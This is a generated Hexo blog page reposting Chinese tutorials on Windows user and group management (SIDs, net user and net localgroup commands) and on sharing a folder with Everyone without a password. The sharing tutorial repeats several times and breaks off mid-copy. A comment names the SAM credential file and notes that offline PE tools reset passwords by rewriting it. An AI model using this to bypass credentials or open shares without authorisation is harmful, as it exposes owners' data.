@@ -1,0 +1,1701 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Windows用户管理-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Windows%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.154Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17126767.html">https://www.cnblogs.com/junlin623/p/17126767.html</a></p>
+<hr>
+<p>title: ‘Windows用户管理-junlin623’<br>date: 2023-02-16 14:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h3 id="1-用户概述："><a href="#1-用户概述：" class="headerlink" title="1. 用户概述："></a>1. 用户概述：</h3><hr>
+<h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><ul>
+<li><p>每一个用户登录系统后，拥有不同的操作权限</p>
+</li>
+<li><p>每个账户有自己唯一的SID（安全标识符）</p>
+</li>
+<li><p>用户SID：<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230216142947246-116082373.png" width=30% ></p>
+<p>这个500表示的是用户UID</p>
+</li>
+<li><p>系统SID：<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230216143029783-371852488.png" width=30% ></p>
+<p>这一段在电脑中的所有用户都是相同的，只有后面的数字不同(用户id）</p>
+</li>
+</ul>
+<blockquote>
+<p>windows 系统管理员administrator的UID是 500</p>
+<p>普通用户是1000 开始的</p>
+<p>linux 系统管理员root 的UID是 0</p>
+<p>普通用户是1000开始</p>
+</blockquote>
+<p>不同的账户拥有不同的权限，为不同的账户赋权限，也就是为不同的账户的SID赋权限</p>
+<p>账号密码存储的位置 ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这个文件在系统运行过程中是无法打开的</span></span><br><span class="line"><span class="comment"># 文件内容通过哈希加密，不可逆，所以不可能通过该文件获取密码, 如果想要破解只能是通过暴力破解或撞库</span></span><br><span class="line"><span class="comment"># 系统验证密码是否正确是通过对输入的密码再做一次哈希加密比较与sam文件中的哈希值是否相同</span></span><br><span class="line"><span class="comment"># 通过PE破解密码的原理就是修改该文件的内容(不能知道原来的密码是多少，但是可以重新设置一个)</span></span><br><span class="line">C:\windows\system32\config\SAM </span><br></pre></td></tr></table></figure>
+
+<p>windows系统上，默认密码最长有效期42天（尤其是服务器系统）</p>
+<h4 id="1-2-内置账户"><a href="#1-2-内置账户" class="headerlink" title="1.2 内置账户"></a>1.2 内置账户</h4><ul>
+<li><p>给人使用账户</p>
+<ul>
+<li><p>administrator  # 管理员账户</p>
+</li>
+<li><p>guest              </p>
+<blockquote>
+<p>来宾账户， 退出登录之后家目录自动消失, 所以在guest用户登录过程中存储的一系列文件都会在退出登录后消失</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>计算机服务组件相关的系统账号</p>
+<ul>
+<li><p>system             # 系统账户  &#x3D;&#x3D; 权限至高无上</p>
+</li>
+<li><p>local service     # 本地服务账户 &#x3D;&#x3D; 权限等于普通用户</p>
+</li>
+<li><p>network service   # 网络服务账户 &#x3D;&#x3D; 权限等于普通用户</p>
+</li>
+</ul>
+<blockquote>
+<p>在services.msc中的服务都对应着其中的账户进行管理</p>
+</blockquote>
+</li>
+</ul>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230216143233419-1668119400.png" width="60%" >
+
+
+
+<h3 id="2-用户管理"><a href="#2-用户管理" class="headerlink" title="2. 用户管理"></a>2. 用户管理</h3><hr>
+<h4 id="2-1-配置文件"><a href="#2-1-配置文件" class="headerlink" title="2.1 配置文件"></a>2.1 配置文件</h4><p> Windows也为每个用户提供了一个 “家” (Linux的home)： <code>C:/Users/用户名</code>， 不同用户登录系统的桌面肯定是不一样的</p>
+<p>内置管理员账户 Administrator 可以访问其他用户的家目录，而其他用户在没有被授予管理员权限的情况下则无法访问 Administrator 用户的家目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出当前用户目录</span></span><br><span class="line"><span class="built_in">echo</span> %USERPROFILE% </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-用户管理命令"><a href="#2-2-用户管理命令" class="headerlink" title="2.2 用户管理命令"></a>2.2 用户管理命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user  <span class="comment"># 查看系统的所有用户</span></span><br><span class="line">net user 用户名  <span class="comment"># 查看指定用户</span></span><br><span class="line">net user 用户名 密码  <span class="comment"># 给指定用户名修改密码，只有管理员用户使用</span></span><br><span class="line">net user 用户名 密码 /add <span class="comment"># 新建用户并指定登录密码</span></span><br><span class="line">net user 用户名  /del  <span class="comment"># 删除用户</span></span><br><span class="line">net user 用户名 /active:<span class="built_in">yes</span>/no  <span class="comment"># 激活或禁用账户</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-用户组管理"><a href="#3-用户组管理" class="headerlink" title="3. 用户组管理"></a>3. 用户组管理</h3><hr>
+<h4 id="3-1-概述："><a href="#3-1-概述：" class="headerlink" title="3.1 概述："></a>3.1 概述：</h4><p>组的作用：简化权限赋予，可以批量给同组的用户设置权限，方便管理</p>
+<p>赋权限方式：</p>
+<p>​	1)用户 - 组-赋权限</p>
+<p>​	2)用户-赋权限</p>
+<h4 id="3-2-内置组（系统自带组）"><a href="#3-2-内置组（系统自带组）" class="headerlink" title="3.2 内置组（系统自带组）"></a>3.2 内置组（系统自带组）</h4><p>内置组的权限默认已经被系统赋予</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见的组</span></span><br><span class="line">Administrators     <span class="comment"># 管理员组</span></span><br><span class="line">Guests             <span class="comment"># 来宾组</span></span><br><span class="line">Users              <span class="comment"># 普通用户组，使用net user xx /add 命令新建的用户默认属于Users组</span></span><br></pre></td></tr></table></figure>
+
+<p>windows2003的一些内置组及介绍：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230216143540748-1952946992.png" width="60%" >
+
+
+<h4 id="3-3-组管理命令"><a href="#3-3-组管理命令" class="headerlink" title="3.3 组管理命令"></a>3.3 组管理命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net localgroup                    <span class="comment"># 查看所有组</span></span><br><span class="line">net localgroup 组名               <span class="comment"># 查看指定组</span></span><br><span class="line">net localgroup 组名 /add          <span class="comment"># 创建组</span></span><br><span class="line">net localgroup 组名 用户名 /add   <span class="comment"># 添加组成员</span></span><br><span class="line">net localgroup 组名 用户名 /del   <span class="comment"># 删除组成员</span></span><br><span class="line">net localgroup 组名 /del         <span class="comment"># 删除组</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>即使将某个用户添加到了管理员组，它的权限还是低于内置的Administrator账户</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Windows%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86-junlin623/" data-id="clhrwf8j40013ekszheyi25ej" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-windows共享文件夹并设置免密码访问-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/windows%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%85%8D%E5%AF%86%E7%A0%81%E8%AE%BF%E9%97%AE-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.152Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17035135.html">https://www.cnblogs.com/junlin623/p/17035135.html</a></p>
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性"><a href="#1-右击文件选择属性" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享"><a href="#2-点击共享" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享"><a href="#4-赋予相应权限，点击共享" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享"><a href="#5-完成共享" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问"><a href="#6-在另一台电脑上进行访问" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名："><a href="#主机名：" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址："><a href="#ip地址：" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问"><a href="#7-配置无需用户名和密码访问" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-1"><a href="#1-右击文件选择属性-1" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-1"><a href="#2-点击共享-1" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-1"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-1" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-1"><a href="#4-赋予相应权限，点击共享-1" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享-1"><a href="#5-完成共享-1" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-1"><a href="#6-在另一台电脑上进行访问-1" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-1"><a href="#主机名：-1" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-1"><a href="#ip地址：-1" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-1"><a href="#7-配置无需用户名和密码访问-1" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-2"><a href="#1-右击文件选择属性-2" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-2"><a href="#2-点击共享-2" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-2"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-2" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-2"><a href="#4-赋予相应权限，点击共享-2" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享-2"><a href="#5-完成共享-2" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-2"><a href="#6-在另一台电脑上进行访问-2" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-2"><a href="#主机名：-2" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-2"><a href="#ip地址：-2" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-2"><a href="#7-配置无需用户名和密码访问-2" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-3"><a href="#1-右击文件选择属性-3" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-3"><a href="#2-点击共享-3" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-3"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-3" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-3"><a href="#4-赋予相应权限，点击共享-3" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享-3"><a href="#5-完成共享-3" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-3"><a href="#6-在另一台电脑上进行访问-3" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-3"><a href="#主机名：-3" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-3"><a href="#ip地址：-3" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-3"><a href="#7-配置无需用户名和密码访问-3" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-4"><a href="#1-右击文件选择属性-4" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-4"><a href="#2-点击共享-4" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-4"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-4" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-4"><a href="#4-赋予相应权限，点击共享-4" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享-4"><a href="#5-完成共享-4" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-4"><a href="#6-在另一台电脑上进行访问-4" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-4"><a href="#主机名：-4" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-4"><a href="#ip地址：-4" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-4"><a href="#7-配置无需用户名和密码访问-4" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-5"><a href="#1-右击文件选择属性-5" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-5"><a href="#2-点击共享-5" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-5"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-5" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-5"><a href="#4-赋予相应权限，点击共享-5" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
